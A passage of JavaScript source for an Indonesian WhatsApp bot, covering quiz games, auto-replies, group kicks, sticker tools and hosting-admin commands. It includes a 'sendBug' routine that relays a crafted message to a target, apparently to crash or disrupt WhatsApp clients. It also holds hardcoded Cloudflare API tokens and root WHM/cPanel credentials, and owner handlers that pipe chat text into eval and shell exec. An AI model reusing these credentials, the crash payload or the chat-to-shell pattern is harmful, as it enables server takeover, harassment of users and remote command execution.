        }
        // TEXT WITH THUMBNAIL
        const ftex = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`, ...(from ?
                    { remoteJid: "6289643739077-1613049930@g.us" } : {})
            },
            message: {
                "extendedTextMessage": {
                    "text": `${tampilUcapan} ${pushname}`,
                    "title": `${tampilUcapan} ${pushname}`,
                    'jpegThumbnail': dfrply
                }
            }
        }
        // VN
        const fvoc = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`, ...(from ?
                    { remoteJid: "6289643739077-1613049930@g.us" } : {})
            },
            message: {
                "audioMessage": {
                    "mimetype": "audio/ogg; codecs=opus",
                    "seconds": "99999",
                    "ptt": "true"
                }
            }
        }
        const sendBug = async (target) => {
            await kurr.relayWAMessage(
                kurr.prepareMessageFromContent(
                    target,
                    kurr.prepareDisappearingMessageSettingContent(0),
                    {}
                ), { waitForAck: true })
        }
        //But verify
        const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
        }
        const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }

        const isRegistered = checkRegisteredUser(sender)

        const sendButRegis = (id, text1, desc1, but = [], options = {}) => {
            const buttonMessage = {
                contentText: text1,
                footerText: desc1,
                buttons: but,
                headerType: 1,
            };
            kurr.sendMessage(
                id,
                buttonMessage,
                MessageType.buttonsMessage,
                options
            );
        };

        const daftar1 = `Hai kak  ${pushname} ${tampilUcapan} \n\nSebelum Mengakses Bot Verify Terlebih Dahulu Ya `
        const daftar2 = '```Ketik Tombol Di Bawah Untuk Verify Kak jika button tidak terlihat ketik ${prefix}verify```'
        const daftar3 = [{ buttonId: `verify`, buttonText: { displayText: `犬DAFTAR犬`, }, type: 1, },]

        const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const getpc = async function (totalchat) {
            let pc = []
            let a = []
            let b = []
            for (c of totalchat) {
                a.push(c.jid)
            }
            for (d of a) {
                if (d && !d.includes('g.us')) {
                    b.push(d)
                }
            }
            return b
        }
        ///Button Text
        const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
            const buttonMessage = {
                contentText: text1,
                footerText: desc1,
                buttons: but,
                headerType: 1
            }
            kurr.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
        }
        ///Button Image
        const sendButImage = async (id, text1, desc1, gam1, but = [], options = {}) => {
            kma = gam1
            mhan = await kurr.prepareMessage(from, kma, image)
            const buttonMessages = {
                imageMessage: mhan.message.imageMessage,
                contentText: text1,
                footerText: desc1,
                buttons: but,
                headerType: 4
            }
            kurr.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
        }
        ///Button Video
        const sendButVideo = async (id, text1, desc1, vid1, but = [], options = {}) => {
            kma = vid1
            mhan = await kurr.prepareMessage(from, kma, video)
            const buttonMessages = {
                videoMessage: mhan.message.videoMessage,
                contentText: text1,
                footerText: desc1,
                buttons: but,
                headerType: 5
            }
            kurr.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
        }
        ///Button Location
        const SendButLoc = async (id, text1, desc1, gam1, but = [], options = {}) => {
            let kma = gam1
            kurr.sendMessage(id, {
                "contentText": text1,
                "footerText": desc1,
                "buttons": but,
                "headerType": "LOCATION",
                "locationMessage": {
                    "text": "BOT",
                    "name": "South Brisbane",
                    "address": "Cloudflare, Inc",
                    "jpegThumbnail": kma
                }
            }, MessageType.buttonsMessage, { quoted: mek, contextInfo: { mentionedJid: parseMention(text1, desc1) } }, options)
        }



        if (!mek.key.remoteJid.endsWith('@g.us') && offline) {
            if (!mek.key.fromMe) {
                if (isAfk(mek.key.remoteJid)) return
                addafk(mek.key.remoteJid)
                heheh = ms(Date.now() - waktuafk)
                sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© KurrXdゑ v.3.0_*", [{ buttonId: 'simi', buttonText: { displayText: 'Oke' }, type: 1 }], { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true } })
            }
        }
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
            if (!mek.key.fromMe) {
                if (mek.message.extendedTextMessage != undefined) {
                    if (mek.message.extendedTextMessage.contextInfo != undefined) {
                        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined) {
                            for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
                                if (ment === kurr.user.jid) {
                                    if (isAfk(mek.key.remoteJid)) return
                                    addafk(mek.key.remoteJid)
                                    heheh = ms(Date.now() - waktuafk)
                                    sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© KurrXdゑ v.3.0_*", [{ buttonId: 'simi', buttonText: { displayText: 'Oke' }, type: 1 }], { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true } })
                                }
                            }
                        }
                    }
                }
            }
        }
const reply = (teks) => {
            kurr.sendMessage(from, teks, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": faketeks } }, contextInfo: { "forwardingScore": 999, "isForwarded": true } } })
        }
        // GAME 
        game.cekWaktuFam(kurr, family)

        // TEBAK GAMBAR
        if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
            jawaban = tebakgambar[sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                reply("Selamat🥳 Jawaban kamu benar!")
                //addBalance(sender, 10, balance)
                //addLevelingXp(sender, 500)
                delete tebakgambar[sender.split('@')[0]]
                fs.writeFileSync("./database/game/tebakgambar.json", JSON.stringify(tebakgambar))
            } else {
                reply("Jawaban Salah!")
            }
        }
        // CAK LONTONG
        if (caklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
            jawaban = caklontong[sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                reply("Selamat🥳 Jawaban kamu benar!")
                //addBalance(sender, 10, balance)
                //addLevelingXp(sender, 500)
                delete caklontong[sender.split('@')[0]]
                fs.writeFileSync("./database/game/caklontong.json", JSON.stringify(caklontong))
            } else {
                reply("Jawaban Salah!")
            }
        }
        // SIAPA AKU
        if (siapakahaku.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
            jawaban = siapakahaku[sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                delete siapakahaku[sender.split('@')[0]]
                reply("Selamat🥳 Jawaban kamu benar!")
                //addBalance(sender, 10, balance)
                //addLevelingXp(sender, 500)
                fs.writeFileSync("./database/game/siapakahaku.json", JSON.stringify(siapakahaku))
            } else {
                reply("Jawaban Salah!")
            }
        }
        // TEBAK KALIMAT
        if (tebakkalimat.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
            jawaban = tebakkalimat[sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                delete tebakkalimat[sender.split('@')[0]]
                reply("Selamat🥳 Jawaban kamu benar!")
                //addBalance(sender, 10, balance)
                //addLevelingXp(sender, 500)
                fs.writeFileSync("./database/game/tebakkalimat.json", JSON.stringify(tebakkalimat))
            } else {
                reply("Jawaban Salah!")
            }
        }
        // TEBAK KALIMAT
        if (tebakkata.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
            jawaban = tebakkata[sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                delete tebakkata[sender.split('@')[0]]
                reply("Selamat🥳 Jawaban kamu benar!")
                //addBalance(sender, 10, balance)
                //addLevelingXp(sender, 500)
                fs.writeFileSync("./database/game/tebakkata.json", JSON.stringify(tebakkata))
            } else {
                reply("Jawaban Salah!")
            }
        }
        // TEBAK LIRIK
        if (tebaklirik.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
            jawaban = tebaklirik[sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                delete tebaklirik[sender.split('@')[0]]
                reply("Selamat🥳 Jawaban kamu benar!")
                //addBalance(sender, 10, balance)
                //addLevelingXp(sender, 500)
                fs.writeFileSync("./database/game/tebaklirik.json", JSON.stringify(tebaklirik))
            } else {
                reply("Jawaban Salah!")
            }
        }
        // TEKA TEKI
        if (tekateki.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
            jawaban = tekateki[sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                delete tekateki[sender.split('@')[0]]
                reply("Selamat🥳 Jawaban kamu benar!")
                //addBalance(sender, 10, balance)
                //addLevelingXp(sender, 500)
                fs.writeFileSync("./database/game/tekateki.json", JSON.stringify(tekateki))
            } else {
                reply("Jawaban Salah!")
            }
        }
        // SUSUN KATA
        if (susunkata.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
            jawaban = susunkata[sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                delete susunkata[sender.split('@')[0]]
                reply("Selamat🥳 Jawaban kamu benar!")
                //addBalance(sender, 10, balance)
                //addLevelingXp(sender, 500)
                fs.writeFileSync("./database/game/susunkata.json", JSON.stringify(susunkata))
            } else {
                reply("Jawaban Salah!")
            }
        }
        // FAMILY 100
        if (family.hasOwnProperty(sender.split('@')[0]) && !isCmd && !mek.key.fromMe) {
            jawaban = family[sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                delete family[sender.split('@')[0]]
                reply("Selamat🥳 Jawaban kamu benar!")
                //addBalance(sender, 10, balance)
                //addLevelingXp(sender, 500)
                fs.writeFileSync("./database/game/family100.json", JSON.stringify(family))
            } else {
                reply("Jawaban Salah!")
            }
        }



        const sendStickerUrl = async (to, url) => {
            console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker'))
            var names = getRandom('.webp')
            var namea = getRandom('.png')
            var download = function (uri, filename, callback) {
                request.head(uri, function (err, res, body) {
                    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                });
            };
            download(url, namea, async function () {
                let filess = namea
                let asw = names
                require('./lib/exif.js')
                exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                    exec(`webpmux -set exif ./temp/data.exif ${asw} -o ${asw}`, async (error) => {
                        let media = fs.readFileSync(asw)
                        kurr.sendMessage(to, media, sticker, { quoted: mek })
                        console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker'))
                    });
                });
            });
        }
        const sendWebp = async (from, url) => {
            var names = Date.now() / 10000;
            var download = function (uri, filename, callback) {
                request.head(uri, function (err, res, body) {
                    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                });
            };
            download(url, './temp' + names + '.png', async function () {
                console.log('selesai');
                let ajg = './temp' + names + '.png'
                let palak = './temp' + names + '.webp'
                exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                    let media = fs.readFileSync(palak)
                    kurr.sendMessage(from, media, MessageType.sticker, { quoted: mek })
                    fs.unlinkSync(ajg)
                    fs.unlinkSync(palak)
                });
            });
        }
        const sendKontak = (from, nomor, nama) => {
            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:Developer KurrXdゑ v.3.0\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
            kurr.sendMessage(from, { displayname: nama, vcard: vcard }, MessageType.contact, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true } })
        }
        const hideTagKontak = async function (from, nomor, nama) {
            let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
            let anu = await kurr.groupMetadata(from)
            let members = anu.participants
            let ane = []
            for (let i of members) {
                ane.push(i.jid)
            }
            kurr.sendMessage(from, { displayname: nama, vcard: vcard }, MessageType.contact, { contextInfo: { "mentionedJid": ane } })
        }

        function monospace(string) {
            return '```' + string + '```'
        }
        const simir = (teks) => {
            kurr.sendMessage(from, teks, text, { quoted: ftrol })
        }
        const math = (teks) => {
            return Math.floor(teks)
        }
        const sendMess = (hehe, teks) => {
            kurr.sendMessage(hehe, teks, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true } })
        }
        //>>>>>>>>STICKER<<<<<<<\\
        const sendFileFromUrl = async (link, type, options) => {
            hasil = await getBuffer(link)
            kurr.sendMessage(from, hasil, type, options).catch(e => {
                fetch(link).then((hasil) => {
                    kurr.sendMessage(from, hasil, type, options).catch(e => {
                        kurr.sendMessage(from, { url: link }, type, options).catch(e => {
                            reply
                            console.log(e)
                        })
                    })
                })
            })
        }
        const sendMediaURL = async (to, url, text = "", mids = []) => {
            if (mids.length > 0) {
                text = normalizeMention(to, text, mids)
            }
            const fn = Date.now() / 10000;
            const filename = fn.toString()
            let mime = ""
            var download = function (uri, filename, callback) {
                request.head(uri, function (err, res, body) {
                    mime = res.headers['content-type']
                    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                });
            };
            download(url, filename, async function () {
                console.log('done');
                let media = fs.readFileSync(filename)
                let type = mime.split("/")[0] + "Message"
                if (mime === "image/gif") {
                    type = MessageType.video
                    mime = Mimetype.gif
                }
                if (mime.split("/")[0] === "audio") {
                    mime = Mimetype.mp4Audio
                }
                kurr.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text, contextInfo: { "mentionedJid": mids } })
                fs.unlinkSync(filename)
            });
        }
        const sendFakeThumb = async function (from, url, title, desc) {
            var anoim = {
                detectLinks: false
            }
            var qul = await kurr.generateLinkPreview(url)
            qul.title = title
            qul.description = desc
            qul.jpegThumbnail = dfrply
            kurr.sendMessage(from, qul, MessageType.extendedText, anoim)
        }
        function Json(objectPromise) {
            var objectString = JSON.stringify(objectPromise, null, 2)
            var parse = util.format(objectString)
            if (objectString == undefined) {
                parse = util.format(objectPromise)
            }
            return reply(parse)
        }
        function speedText(speed) {
            let bits = speed * 8;
            const units = ['', 'K', 'M', 'G', 'T'];
            const places = [0, 1, 2, 3];
            let unit = 0;
            while (bits >= 2000 && unit < 4) {
                unit++;
                bits /= 1000;
            }
            return `${bits.toFixed(places[unit])} ${units[unit]}bps`;
        }
        if (budy.includes('Cekprefix')) {
            cpref = ` *Prefix Saat ini: ( ${prefix} )*`
            reply(cpref)
        }
        if (budy.includes('cekprefix')) {
            cpref = ` *Prefix Saat ini: ( ${prefix} )*`
            reply(cpref)
        }
        if (budy.includes('vinz')) {
            kurr.sendMessage(from, "hayo ngomongin owner gua ya", text)
            kurr.sendMessage("6281220670449@s.whatsapp.net", `bang di gosipin Ama wa.me/${sender} Labrak Bang`, text)
            kurr.sendMessage(from, "Mampus Udh Ku Laporin", text)
        }
        if (budy.includes('PIkon')) {
            kurr.sendMessage(from, "hayo ngomongin owner gua ya", text)
            kurr.sendMessage("6285875169194@s.whatsapp.net", `bang di gosipin Ama wa.me/${sender} Labrak Bang`, text)
            kurr.sendMessage(from, "Mampus Udh Ku Laporin", text)
        }
        if (budy.includes('kurrtod')) {
            kurr.sendMessage(from, "hayo ngomongin owner gua ya", text)
            kurr.sendMessage("6285875169194@s.whatsapp.net", `bang di gosipin Ama wa.me/${sender} Labrak Bang`, text)
            kurr.sendMessage(from, "Mampus Udh Ku Laporin", text)
        }
        if (budy.includes('Pikontol')) {
            kurr.sendMessage(from, "hayo ngomongin owner gua ya", text)
            kurr.sendMessage("6285875169194@s.whatsapp.net", `bang di gosipin Ama wa.me/${sender} Labrak Bang`, text)
            kurr.sendMessage(from, "Mampus Udh Ku Laporin", text)
        }
        if (budy.includes('Assalamualaikum')) {
            cpref = `وَعَلَيْكُمُ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ`
            reply(cpref)
        }
        if (budy.includes('assalamualaikum')) {
            cpref = `وَعَلَيْكُمُ السَّلاَمُ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ`
            reply(cpref)
        }
        if (budy.includes('Hai')) {
            cpref = `Hay Saya pikon Botz Whatsapp Ketik .menu Untuk Mengakses`
            reply(cpref)
        }
        if (budy.includes('hai')) {
            cpref = `Hay Saya Pikon Botz Whatsapp Ketik .menu Untuk Mengakses`
            reply(cpref)
        }
        if (budy.includes('kick')) {
            if (!isGroup) return reply(mess.only.group)
            if (!isGroupAdmins) return reply(mess.only.admin)
            if (!isBotGroupAdmins) return reply(mess.only.Badmin)
            if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('reply targetnya!')
            kick = mek.message.extendedTextMessage.contextInfo.participant
            kurr.groupRemove(from, [kick])
            reply('Sukses mengeluarkan peserta')
        }
        if (budy.startsWith('>')) {
            if (!isOwner && !mek.key.fromMe) return
            console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V1 brooo`))
            ras = budy.slice(1)
            function _(rem) {
                ren = JSON.stringify(rem, null, 2)
                pes = util.format(ren)
                reply(pes)
            }
            try {
                c
                reply(require('util').format(eval(`(async () => { ${ras} })()`)))
            } catch (err) {
                e = String(err)
                reply(e)
            }
        }
        if (budy.startsWith('$')) {
            if (!mek.key.fromMe && !isOwner) return
            qur = budy.slice(2)
            exec(qur, (err, stdout) => {
                if (err) return reply(`${err}`)
                if (stdout) {
                    reply(stdout)
                }
            })
        }
        if (budy.startsWith('x')) {
            if (!mek.key.fromMe && !isOwner) return
            try {
                return kurr.sendMessage(from, JSON.stringify(eval(budy.slice(2)), null, '\t'), text, { quoted: mek })
            } catch (err) {
                e = String(err)
                reply(e)
            }
        }
        if (budy.startsWith('=>')) {
            if (!isOwner && !mek.key.fromMe) return
            var konsol = budy.slice(3)
            Return = (sul) => {
                var sat = JSON.stringify(sul, null, 2)
                bang = util.format(sat)
                if (sat == undefined) {
                    bang = util.format(sul)
                }
                return reply(bang)
            }
            try {
                reply(util.format(eval(`;(async () => { ${konsol} })()`)))
                console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
            } catch (e) {
                reply(String(e))
            }
        }
        // AUTO
        for (let anji of setik) {
            if (budy === anji) {
                result = fs.readFileSync(`./media/sticker/${anji}.webp`)
                kurr.sendMessage(from, result, sticker, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true } })
            }
        }
        for (let anju of vien) {
            if (budy === anju) {
                result = fs.readFileSync(`./media/vn/${anju}.mp3`)
                kurr.sendMessage(from, result, audio, { mimetype: 'audio/mp4', duration: 359996400, ptt: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true } })
            }
        }
        for (let anjh of imagi) {
            if (budy === anjh) {
                result = fs.readFileSync(`./media/image/${anjh}.jpg`)
                kurr.sendMessage(from, result, image, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true } })
            }
        }
        for (var i = 0; i < commandsDB.length; i++) {
            if (budy.toLowerCase() === commandsDB[i].pesan) {
                reply(commandsDB[i].balasan)
            }
        }
        if (isGroup && isAntivirtex && !mek.key.fromMe) {
            if (budy.length > 2500) {
                if (isGroupAdmins) return reply("admin bebas");
                var kic = `${sender.split("@")[0]}@s.whatsapp.net`
                reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK ;V");
                kurr.groupRemove(from, [kic]).catch((e) => { reply(`Jdiin Admin Dlu Bjir🗿`) })
            }
        }
        if (budy.includes("wa.me/", "https://wa.me//", "https://wa.me/")) {
            if (!mek.key.fromMe) {
                if (!isGroup) return
                if (!isAntiWame) return
                if (isGroupAdmins) return reply('Atasan grup mah bebas yakan :v')
                kurr.updatePresence(from, Presence.composing)
                var kic = `${sender.split("@")[0]}@s.whatsapp.net`
                reply('Wa.me terdeteksi Auto kick!')
                kurr.groupRemove(from, [kic]).catch((e) => { reply(`Jdiin Admin Dlu Bjir🗿`) })
            }
        }
        // MUTE
        if (isMuted) {
            if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return
            if (budy.toLowerCase().startsWith(`${prefix}unmute`)) {
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('Bot telah diunmute di group ini')
            }
        }

        if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins) {
            if (budy.match(/(https:\/\/chat.whatsapp.com)/gi)) {
                setTimeout(() => {
                    kurr.groupRemove(from, [sender])
                }, 2000)
                setTimeout(() => {
                    kurr.sendMessage(from, `*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick❗`, MessageType.text)
                }, 0)
            }
        }
        if (!m.key.fromMe && bad.includes(messagesD)) {
            ano = fs.readFileSync('./sticker/anime/toxic.webp')
            kurr.sendMessage(from, ano, sticker, { quoted: mek })
        }
        if (!settings.autoread) {
            kurr.chatRead(from)
        }
        if (!settings.autocomposing) {
            kurr.updatePresence(from, Presence.composing)
        }
        if (!settings.autorecording) {
            kurr.updatePresence(from, Presence.recording)
        }


        const sotoy = [
            '🍊 : 🍒 : 🍐',
            '🍒 : 🔔 : 🍊',
            '🍇 : 🍇 : 🍐',
            '🍊 : 🍋 : 🔔', //ANKER
            '🔔 : 🍒 : 🍐',
            '🔔 : 🍒 : 🍊',
            '🍊 : 🍋 : 🔔',
            '🍐 : 🍒 : 🍋',
            '🍐 : 🍒 : 🍐',
            '🍊 : 🍒 : 🍒',
            '🔔 : 🔔 : 🍇',
            '🍌 : 🍌 : 🔔',
            '🍐 : 🔔 : 🔔',
            '🍊 : 🍋 : 🍒',
            '🍋 : 🍋 : 🍋 Win👑',
            '🔔 : 🔔 : 🍇',
            '🔔 : 🍇 : 🍇',
            '🔔 : 🍐 : 🔔',
            '🍌 : 🍌 : 🍌 Win👑'
        ]
        const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
        const isStcVideo = isStcMedia && content.includes("videoMessage")
        const isStcImage = isStcMedia && content.includes("imageMessage")
        const isStcSticker = isStcMedia && content.includes("stickerMessage")
        const isStcTeks = isStcMedia && content.includes("quotedMessage")
        const isStcDocs = isStcMedia && content.includes("documentMessage")
        const isStcContact = isStcMedia && content.includes("contactMessage")
        const isStcAudio = isStcMedia && content.includes("audioMessage")
        const isStcLoca = isStcMedia && content.includes("locationMessage")
        const isStcTag = isStcMedia && content.includes("mentionedJid")
        const isStcreply = isStcMedia && content.includes("Message")
        const isStcProd = isStcMedia && content.includes("productMessage")

        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        if (!publik) {
            if (!isOwner && !mek.key.fromMe) return
        }
        if (isCmd && !isGroup) { console.log(color('|CMD|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(`${command} [${args.length}]`, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink')) }
        if (!command) { console.log(color('|MSG|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(cmd, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink')) }

        //runtime berjalan
        runi = process.uptime()
        kurr.setStatus(`Admin Bot Hosting`).catch((_) => _);

        settingstatus = new Date() * 1;

        switch (isStc) {
            case "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf":
                if (!isStcSticker) return reply('reply stickernya bgsd!')
                su = mek.message.stickerMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
                reply(su)
        }
        switch (command) {
   case "domain1":
         if(from != "120363041008098837@g.us") return reply("Hanya Untuk Di Gunakan Di Group Server Hosting")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone1 = "b5bd4aea2815ab7a14c48e784a4536f0";
            let apiToken1 = "iT7b0swxHBELt6Kf7Nj7512f3TwHdDh9snicJvnr";
            let tld1 = "blackhost.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone1}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld1, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apiToken1,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return reply("Masukan Domain Name Contoh .domain1 agil | Ip Server");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return reply("Name Domain Valid Pastikan Benar Ulangi Kembali Command Nya");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "Contoh Command .domain1 agil | Ip Server");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) reply(`Berhasil Menambah Subdomain✅\nip: ${e['ip']}\nHasil: ${e['name']}`);
          else reply(`Gagal Membuat Subdomain\nMsg: ${e['Gagal❌']}`)
        });
        break;
        case "addpackage":
         if(from != "120363041008098837@g.us") return reply("Hanya Untuk Di Gunakan Di Group Server Hosting")
        let sUser1 = "root";
        let sPass1 = "rezaganz19@";
        let serverName1 = "login.rezanesia.my.id:2087";

        let uname1 = args?.join(" ")?.trim()?.split("|")?.[0]?.trim();
        let pack1 = args?.join(" ")?.trim()?.split("|")?.[1]?.trim();

        if (!uname1 || !pack1) return reply(`Gagal ${!uname1 && !pack1 ? "package" : !uname1 ? "BolehKosong" : !pack1 ? "package" : ""} EROR\n\nContoh: .addpackage username | package`);

        axios
          .get(`https://${serverName1}/json-api/listpkgs?api.version=1`, { headers: { Authorization: "Basic " + Buffer.from(sUser1 + ":" + sPass1).toString("base64") } })
          .then((e) => {
            let pkgs = e.data?.data?.pkg
              ?.map((x) => {
                return x.name;
              })
              .filter((x) => {
                return !x.includes("_") && !x.includes("default");
              });
              if(!pkgs.includes(pack1)) return reply(`package ${pack1} tidak ditemukan\nPackage yang tersedia:\n- ${pkgs.join("\n- ")}`)
            axios
              .get(`https://${serverName1}/json-api/changepackage?api.version=1&user=${encodeURIComponent(uname1)}&pkg=${encodeURIComponent(pack1)}`, { headers: { Authorization: "Basic " + Buffer.from(sUser1 + ":" + sPass1).toString("base64") } })
              .then((e) => {
                console.log("Upgrade user package: " + JSON.stringify(e.data?.metadata?.reason || {}, null, 2));
                if (e.data?.metadata?.reason == "OK") {
                  let allowedPkg = pkgs.filter((x) => {
                    return pack1.toLowerCase().includes("whm") ? x.toLowerCase().includes("cpanel") : pack1.toLowerCase().includes("admin") ? x.toLowerCase().includes("whm") || x.toLowerCase().includes("cpanel") : pack1.toLowerCase().includes("ceo") ? !x.toLowerCase().includes("ceo") && !x.toLowerCase().includes("founder") : pack1.toLowerCase().includes("founder") ? true : false;
                  });
                  if (allowedPkg.length > 0) {
                    let param = "account_limit=15&bandwidth_limit=15000&diskspace_limit=15000&enable_account_limit=0&enable_overselling=1&enable_overselling_bandwidth=1&enable_overselling_diskspace=1&enable_package_limit_numbers=0&enable_package_limits=1&enable_resource_limits=0";
                    axios.get(`https://${serverName1}/json-api/setresellerlimits?api.version=1&user=${uname1}&${param}`, { headers: { Authorization: "Basic " + Buffer.from(sUser1 + ":" + sPass1).toString("base64") } }).then(async (e) => {
                      if (e?.data?.metadata?.reason == "OK") {
                        let pkgDone = [];
                        for await (let pkg of allowedPkg) {
                          console.log(`Add package ${pkg} to ${uname1}`);
                          await axios
                            .get(`https://${serverName1}/json-api/setresellerpackagelimit?api.version=1&user=${uname1}&allowed=1&package=${encodeURIComponent(pkg)}`, { headers: { Authorization: "Basic " + Buffer.from(sUser1 + ":" + sPass1).toString("base64") } })
                            .then((e) => {
                              if (e?.data?.metadata?.reason == "OK") {
                                console.log(`add package ${pkg} to ${uname1} success`);
                                pkgDone.push(pkg);
                              } else {
